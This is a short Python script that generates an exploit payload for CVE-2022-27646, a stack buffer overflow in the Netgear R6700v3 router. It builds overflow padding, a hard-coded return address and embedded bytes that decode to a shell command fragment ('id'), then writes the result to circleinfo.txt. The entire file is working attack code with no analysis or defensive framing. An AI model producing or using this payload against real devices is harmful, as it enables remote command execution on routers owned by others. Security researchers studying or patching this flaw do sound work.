#!/usr/bin/env python3
## -*- coding: utf-8 -*-
import argparse

def main() -> None:
    # Argument parsing
    description = """
    Create payloads to exploit CVE-2022-27646 (stack buffer overflow on Netgear
    R6700v3).
    """
    parser = argparse.ArgumentParser(description=description,
                                     formatter_class=argparse.ArgumentDefaultsHelpFormatter)
    parser.add_argument("--out", default="circleinfo.txt",
                        help="output file containing the payload")
    args = parser.parse_args()

    # Payload generation
    payload  = b"A"*368
    payload += b"\x50\xc2\xff\xbe"
    payload += b"B"*20
    payload += b"\xb8\xc9\x00\x00"
    payload += b"\x69\x64\x3e\x2f"
    payload += b"\x69\x64\x3b\x23"
    payload += b"C"*617
    payload += b" X"

    # File writing
    with open(args.out, "wb") as f:
        f.write(payload)
    
    return

if __name__ == "__main__":
    main()